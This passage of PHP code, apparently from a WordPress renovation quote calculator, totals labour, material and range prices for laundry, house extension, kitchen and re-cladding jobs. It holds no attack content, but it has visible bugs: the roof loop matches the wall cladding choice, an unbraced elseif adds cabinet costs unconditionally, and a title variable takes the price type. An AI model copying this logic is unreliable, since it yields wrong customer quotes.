                                        if($current_fixtures_prices == 'labour') {
                                                $labour_price_total = $fixture['labour'];
                                                $labour_price_total_value = 0;
                                                $material_price_total = $fixture['material'];
                                                $material_price_total_value = 0;
                                                foreach($labour_price_total as $l) {
                                                        $labour_price_total_value = $labour_price_total_value + $l['price'];
                                                }
                                                foreach($material_price_total as $m) {
                                                        $material_price_total_value = $material_price_total_value + $m['price'];
                                                }
                                                $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                                // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                                $selectionPrice = 0;
                                                $selectionPrice = go_calculate_selection($selectionsData,$current_fixtures_title,$fixture['title']);
                                                $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                                // *** END ***

                                                $current_fixtures_total = $current_fixtures_total + ( $labour_and_material_total * $floor_area );
                                        }
                                        elseif($current_fixtures_prices == 'range') {
                                                $range_price_total = $fixture['range_price'];
                                                $current_fixtures_total = $current_fixtures_total + ( $range_price_total * $floor_area);
                                        }

                                }
                        }

                }

                $paint_ceilings = $data['ceilings'];
                $paint_ceilings_total = 0;
                if($paint_ceilings == 'Yes') {
                        foreach($paint_ceilings_data as $temp) {
                                if($temp['title'] == 'Yes') {

                                        if($paint_ceilings_prices == 'labour') {
                                                $labour_price_total = $temp['labour'];
                                                $labour_price_total_value = 0;
                                                $material_price_total = $temp['material'];
                                                $material_price_total_value = 0;
                                                foreach($labour_price_total as $l) {
                                                        $labour_price_total_value = $labour_price_total_value + $l['price'];
                                                }
                                                foreach($material_price_total as $m) {
                                                        $material_price_total_value = $material_price_total_value + $m['price'];
                                                }
                                                $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                                // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                                $selectionPrice = 0;
                                                $selectionPrice = go_calculate_selection($selectionsData,$paint_ceilings_title,$temp['title']);
                                                $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                                // *** END ***

                                                $paint_ceilings_total = $paint_ceilings_total + ( $labour_and_material_total * $floor_area );
                                        }
                                        elseif($paint_ceilings_prices == 'range') {
                                                $range_price_total = $temp['range_price'];
                                                $paint_ceilings_total = $paint_ceilings_total + ( $range_price_total * $floor_area );
                                        }

                                }
                        }

                }

                $proposed_fixtures = $data['fixtures'];
                $proposed_fixtures_total = 0;
                foreach($proposed_fixtures_data as $fixture) {
                        if( in_array($fixture['title'],$proposed_fixtures) ) {

                                if($proposed_fixtures_prices == 'labour') {
                                        $labour_price_total = $fixture['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $fixture['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$proposed_fixtures_title,$fixture['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $proposed_fixtures_total = $proposed_fixtures_total + $labour_and_material_total;
                                }
                                elseif($proposed_fixtures_prices == 'range') {
                                        $range_price_total = $fixture['range_price'];
                                        $proposed_fixtures_total = $proposed_fixtures_total + $range_price_total;
                                }

                        }
                }

                $flooring = $data['floor'];
                $flooring_total = 0;
                foreach($flooring_data as $temp) {
                        if( $temp['title'] == $flooring ) {

                                if($flooring_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$flooring_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $flooring_total = $labour_and_material_total * $floor_area;
                                }
                                elseif($flooring_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $flooring_total = $range_price_total * $floor_area;
                                }

                        }
                }

                $walls = $data['walls'];
                $walls_total = 0;
                foreach($walls_data as $temp) {
                        if( $temp['title'] == $walls ) {

                                if($walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $walls_total = $labour_and_material_total * $wall_area;
                                }
                                elseif($walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $walls_total = $range_price_total * $wall_area;
                                }

                        }
                }

                $extra = $data['extras'];
                $extra_total = 0;
                foreach($extra_data as $temp) {
                        if( in_array($temp['title'],$extra) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($extra_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extra_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
                                }
                                elseif($extra_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extra_total = $extra_total + ( $range_price_total * $extra_count);
                                }

                        }

                }

                $laundry_total = $current_fixtures_total + $paint_ceilings_total + $proposed_fixtures_total + $flooring_total + $walls_total + $extra_total;
                $total = $total + $laundry_total;

        }

        // V2 formulas for House Extension template
        if(get_the_title($t) == 'House Extension') {

                $all_scope_data = get_field('quote_fields',$t);
                $house_extension_total = 0;

                $width = $data['area_width'];
                $length = $data['area_length'];

                $floor_area = $width * $length;

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'rooms') {
                                $pick_rooms_title = $d['title'];
                                $pick_rooms_prices = $d['type_of_price'];
                                $pick_rooms_data = $d['fields'];
                        }
                        if($d['slug'] == 'foundation') {
                                $foundation_title = $d['title'];
                                $foundation_prices = $d['type_of_price'];
                                $foundation_data = $d['fields'];
                        }
                        if($d['slug'] == 'cladding') {
                                $cladding_title = $d['title'];
                                $cladding_prices = $d['type_of_price'];
                                $cladding_data = $d['fields'];
                        }
                        if($d['slug'] == 'roof') {
                                $roof_title = $d['title'];
                                $roof_prices = $d['type_of_price'];
                                $roof_data = $d['fields'];
                        }
                        if($d['slug'] == 'site') {
                                $site_title = $d['title'];
                                $site_prices = $d['type_of_price'];
                                $site_data = $d['fields'];
                        }
                }

                $pick_rooms = $data['rooms'];
                $pick_rooms_total = 0;
                foreach($pick_rooms_data as $temp) {
                        if( in_array($temp['title'],$pick_rooms) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($pick_rooms_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$pick_rooms_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $pick_rooms_total = $pick_rooms_total + ( $labour_and_material_total * $extra_count );
                                }
                                elseif($pick_rooms_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $pick_rooms_total = $pick_rooms_total + ( $range_price_total * $extra_count );
                                }

                        }
                }

                $foundation = $data['foundation'];
                $foundation_total = 0;
                foreach($foundation_data as $temp) {
                        if( $temp['title'] == $foundation ) {

                                if($foundation_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$foundation_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $foundation_total = $labour_and_material_total;
                                }
                                elseif($foundation_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $foundation_total = $range_price_total;
                                }

                        }
                }

                $wall_cladding = $data['cladding'];
                $wall_cladding_total = 0;
                foreach($cladding_data as $temp) {
                        if( $temp['title'] == $wall_cladding ) {

                                if($cladding_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$cladding_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $wall_cladding_total = $labour_and_material_total;
                                }
                                elseif($cladding_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $wall_cladding_total = $range_price_total;
                                }

                        }
                }

                $roof_cladding = $data['roof'];
                $roof_cladding_total = 0;
                foreach($roof_data as $temp) {
                        if( $temp['title'] == $wall_cladding ) {

                                if($roof_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$roof_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $roof_cladding_total = $labour_and_material_total;
                                }
                                elseif($roof_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $roof_cladding_total = $range_price_total;
                                }

                        }
                }

                $site = $data['site'];
                $site_total_1 = 0;
                $site_total_2 = 0;
                foreach($site_data as $temp) {
                        if( in_array($temp['title'],$site) && ( $temp['title'] == 'Easy Access' || $temp['title'] == 'Flat land' || $temp['title'] == 'Difficult Access' || $temp['title'] == 'Sloping Site' || $temp['title'] == 'Minor Demolition' || $temp['title'] == 'Major Demolition' ) ) {

                                $range_price_total = $temp['range_price'];
                                $site_total_1 = $range_price_total;

                        }
                        elseif( in_array($temp['title'],$site) && ( $temp['title'] == 'Scaffolding Needed' ) ) {

                                $range_price_total = $temp['range_price'];
                                $site_total_2 = $range_price_total;

                        }
                }

                $house_sub_total = $foundation_total + $roof_cladding_total + $wall_cladding_total;
                $site_total_summ = ($house_sub_total * $site_total_1)/100;

                $house_extension_total = $floor_area * ( $house_sub_total + $site_total_summ ) + $site_total_2 + $pick_rooms_total;
                $total = $total + $house_extension_total;

        }

        // V2 formulas for Kitchen template
        if(get_the_title($t) == 'Kitchen Renovation') {

                $all_scope_data = get_field('quote_fields',$t);

                $kitchen_total_price = 0;
                $width = $data['square_width'];
                $length = $data['square_length'];

                $floor_area = $width * $length;


                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'ceiling_height') {
                                $height_data = $d['fields'];
                        }
                        if($d['slug'] == 'current') {
                                $current_fixtures_title = $d['title'];
                                $current_fixtures_prices = $d['type_of_price'];
                                $current_fixtures_data = $d['fields'];
                        }
                        if($d['slug'] == 'appliances') {
                                $proposed_fixtures_title = $d['title'];
                                $proposed_fixtures_prices = $d['type_of_price'];
                                $proposed_fixtures_data = $d['fields'];
                        }
                        if($d['slug'] == 'ceiling') {
                                $paint_ceilings_title = $d['title'];
                                $paint_ceilings_prices = $d['type_of_price'];
                                $paint_ceilings_data = $d['fields'];
                        }
                        if($d['slug'] == 'floor') {
                                $flooring_title = $d['title'];
                                $flooring_prices = $d['type_of_price'];
                                $flooring_data = $d['fields'];
                        }
                        if($d['slug'] == 'walls') {
                                $walls_title = $d['title'];
                                $walls_prices = $d['type_of_price'];
                                $walls_data = $d['fields'];
                        }
                        if($d['slug'] == 'extras') {
                                $extra_title = $d['title'];
                                $extra_prices = $d['type_of_price'];
                                $extra_data = $d['fields'];
                        }
                        if($d['slug'] == 'cabinetry') {
                                $layout_title = $d['title'];
                                $layout_prices = $d['type_of_price'];
                                $layout_data = $d['fields'];
                        }
                        if($d['slug'] == 'cabinets') {
                                $cabinets_title = $d['type_of_price'];
                                $cabinets_prices = $d['type_of_price'];
                                $cabinets_data = $d['fields'];
                        }
                        if($d['slug'] == 'island') {
                                $island_title = $d['title'];
                                $island_prices = $d['type_of_price'];
                                $island_data = $d['fields'];
                        }
                        if($d['slug'] == 'benchtop') {
                                $benchtop_data = $d['fields'];
                        }
                        if($d['slug'] == 'finish') {
                                $cabinetry_finish_data = $d['fields'];
                        }
                        if($d['slug'] == 'size') {
                                $kitchen_size_title = $d['title'];
                                $kitchen_size_prices = $d['type_of_price'];
                                $kitchen_size_data = $d['fields'];
                        }

                }

                $height = $data['ceiling_height'];
                $height_total = 0;
                foreach($height_data as $temp) {
                        if( $temp['title'] == $height ) {

                                $range_price_total = $temp['range_price'];
                                $height_total = $range_price_total;

                        }
                }

                $wall_area = ( $width + $width + $length + $length ) * $height_total;

                $demolition = $data['demolition'];
                $current_fixtures = $data['current'];
                $current_fixtures_total = 0;
                if($demolition == 'Yes') {
                        foreach($current_fixtures_data as $fixture) {
                                if( in_array($fixture['title'],$current_fixtures) ) {

                                        if($current_fixtures_prices == 'labour') {
                                                $labour_price_total = $fixture['labour'];
                                                $labour_price_total_value = 0;
                                                $material_price_total = $fixture['material'];
                                                $material_price_total_value = 0;
                                                foreach($labour_price_total as $l) {
                                                        $labour_price_total_value = $labour_price_total_value + $l['price'];
                                                }
                                                foreach($material_price_total as $m) {
                                                        $material_price_total_value = $material_price_total_value + $m['price'];
                                                }
                                                $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                                // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                                $selectionPrice = 0;
                                                $selectionPrice = go_calculate_selection($selectionsData,$current_fixtures_title,$fixture['title']);
                                                $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                                // *** END ***

                                                $current_fixtures_total = $current_fixtures_total + $labour_and_material_total;
                                        }
                                        elseif($current_fixtures_prices == 'range') {
                                                $range_price_total = $fixture['range_price'];
                                                $current_fixtures_total = $current_fixtures_total + $range_price_total;
                                        }

                                }

                        }

                }

                $paint_ceilings = $data['ceiling'];
                $paint_ceilings_total = 0;
                if($paint_ceilings == 'Yes') {
                        foreach($paint_ceilings_data as $temp) {
                                if($temp['title'] == 'Yes') {

                                        if($paint_ceilings_prices == 'labour') {
                                                $labour_price_total = $temp['labour'];
                                                $labour_price_total_value = 0;
                                                $material_price_total = $temp['material'];
                                                $material_price_total_value = 0;
                                                foreach($labour_price_total as $l) {
                                                        $labour_price_total_value = $labour_price_total_value + $l['price'];
                                                }
                                                foreach($material_price_total as $m) {
                                                        $material_price_total_value = $material_price_total_value + $m['price'];
                                                }
                                                $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                                // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                                $selectionPrice = 0;
                                                $selectionPrice = go_calculate_selection($selectionsData,$paint_ceilings_title,$temp['title']);
                                                $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                                // *** END ***

                                                $paint_ceilings_total = $paint_ceilings_total + ( $labour_and_material_total * $floor_area );
                                        }
                                        elseif($paint_ceilings_prices == 'range') {
                                                $range_price_total = $temp['range_price'];
                                                $paint_ceilings_total = $paint_ceilings_total + ( $range_price_total * $floor_area );
                                        }

                                }
                        }

                }

                $layout = $data['cabinetry'];
                $layout_total = 0;
                foreach($layout_data as $temp) {
                        if( $temp['title'] == $layout ) {

                                if($layout_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$layout_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $layout_total = $labour_and_material_total;
                                }
                                elseif($layout_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $layout_total = $range_price_total;
                                }

                        }
                }

                $cabinets = $data['cabinets'];
                        $cabinets_total = 0;
                        foreach($cabinets_data as $temp) {
                                if( in_array($temp['title'],$cabinets) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $cabinets_count = $data['' . $count_field_title . ''];
                                if($cabinets_count == NULL || $cabinets_count == '' || empty($cabinets_count)) {
                                       $cabinets_count = 1;
                                }

                                if($cabinets_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$cabinets_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $cabinets_total = $cabinets_total +  ( $labour_and_material_total * $cabinets_count);
                                }
                                elseif($cabinets_prices == 'range')
                                        $range_price_total = $temp['range_price'];
                                        $cabinets_total = $cabinets_total + ( $range_price_total * $cabinets_count);
                                }

                        }



                $island = $data['island'];
                $island_total = 0;
                if($island == 'Yes') {
                        foreach($island_data as $temp) {
                                if($temp['title'] == 'Yes') {

                                        if($island_prices == 'labour') {
                                                $labour_price_total = $temp['labour'];
                                                $labour_price_total_value = 0;
                                                $material_price_total = $temp['material'];
                                                $material_price_total_value = 0;
                                                foreach($labour_price_total as $l) {
                                                        $labour_price_total_value = $labour_price_total_value + $l['price'];
                                                }
                                                foreach($material_price_total as $m) {
                                                        $material_price_total_value = $material_price_total_value + $m['price'];
                                                }
                                                $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                                // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                                $selectionPrice = 0;
                                                $selectionPrice = go_calculate_selection($selectionsData,$island_title,$temp['title']);
                                                $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                                // *** END ***

                                                $island_total = $labour_and_material_total;
                                        }
                                        elseif($island_prices == 'range') {
                                                $range_price_total = $temp['range_price'];
                                                $island_total = $range_price_total;
                                        }

                                }
                        }

                }

                $benchtop = $data['benchtop'];
                $benchtop_total = 0;
                foreach($benchtop_data as $temp) {
                        if( $temp['title'] == $benchtop ) {

                                $range_price_total = $temp['range_price'];
                                $benchtop_total = $range_price_total;

                        }
                }

                $cabinetry_finish = $data['finish'];
                $cabinetry_finish_total = 0;
                foreach($cabinetry_finish_data as $temp) {
                        if( $temp['title'] == $cabinetry_finish ) {

                                $range_price_total = $temp['range_price'];
                                $cabinetry_finish_total = $range_price_total;

                        }
                }

                $kitchen_size = $data['size'];
                $kitchen_size_total = 0;
                foreach($kitchen_size_data as $temp) {
                        if( $temp['title'] == $kitchen_size ) {

                                if($kitchen_size_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$kitchen_size_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $kitchen_size_total = $labour_and_material_total;
                                }
                                elseif($kitchen_size_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $kitchen_size_total = $range_price_total;
                                }

                        }
                }

                $flooring = $data['floor'];
                $flooring_total = 0;
                foreach($flooring_data as $temp) {
                        if( $temp['title'] == $flooring ) {

                                if($flooring_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$flooring_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $flooring_total = $labour_and_material_total * $floor_area;
                                }
                                elseif($flooring_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $flooring_total = $range_price_total * $floor_area;
                                }

                        }
                }

                $walls = $data['walls'];
                $walls_total = 0;
                foreach($walls_data as $temp) {
                        if( $temp['title'] == $walls ) {

                                if($walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $walls_total = $labour_and_material_total * $wall_area;
                                }
                                elseif($walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $walls_total = $range_price_total * $wall_area;
                                }

                        }
                }

                $proposed_fixtures = $data['appliances'];
                $proposed_fixtures_total = 0;
                foreach($proposed_fixtures_data as $fixture) {
                        if( in_array($fixture['title'],$proposed_fixtures) ) {

                                if($proposed_fixtures_prices == 'labour') {
                                        $labour_price_total = $fixture['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $fixture['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$proposed_fixtures_title,$fixture['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $proposed_fixtures_total = $proposed_fixtures_total + $labour_and_material_total;
                                }
                                elseif($proposed_fixtures_prices == 'range') {
                                        $range_price_total = $fixture['range_price'];
                                        $proposed_fixtures_total = $proposed_fixtures_total + $range_price_total;
                                }

                        }
                }

                $extra = $data['extras'];
                $extra_total = 0;
                foreach($extra_data as $temp) {
                        if( in_array($temp['title'],$extra) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($extra_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extra_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
                                }
                                elseif($extra_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extra_total = $extra_total + ( $range_price_total * $extra_count);
                                }

                        }

                }

                $layout_sub = $layout_total + $cabinets_total + $island_total + $kitchen_size_total;
                $size_finish_sub = $cabinetry_finish_total;

                $layout_full = ($layout_sub*$size_finish_sub/100) + $layout_sub;

                $benchtop_sub = ($layout_total * $benchtop_total)/100;
                $kitchen_full = $layout_full + $benchtop_sub;

                $kitchen_total_price = $paint_ceilings_total + $current_fixtures_total + $kitchen_full + $flooring_total + $walls_total + $extra_total + $proposed_fixtures_total;
                $total = $total + $kitchen_total_price;

        }

        // V2 formulas for Recladding template
        if(get_the_title($t) == 'Re-Cladding') {

                $all_scope_data = get_field('quote_fields',$t);

                $width = $data['area_width'];
                $length = $data['area_length'];

                foreach($all_scope_data as $d) {
                        if($d['slug'] == 'ceiling') {
                                $height_data = $d['fields'];
                        }
                        if($d['slug'] == 'current') {
                                $current_cladding_title = $d['title'];
                                $current_cladding_prices = $d['type_of_price'];
                                $current_cladding_data = $d['fields'];
                        }
                        if($d['slug'] == 'joinery') {
                                  $windows_and_doors_title = $d['title'];
                                $windows_and_doors_prices = $d['type_of_price'];
                                $windows_and_doors_data = $d['fields'];
                        }
                        if($d['slug'] == 'proposed') {
                                $proposed_title = $d['title'];
                                $proposed_prices = $d['type_of_price'];
                                $proposed_data = $d['fields'];
                        }
                        if($d['slug'] == 'paint') {
                                $painted_title = $d['title'];
                                $painted_prices = $d['type_of_price'];
                                $painted_data = $d['fields'];
                        }
                }

                $height = $data['ceiling'];
                $height_total = 0;
                foreach($height_data as $temp) {
                        if( $temp['title'] == $height ) {

                                $range_price_total = $temp['range_price'];
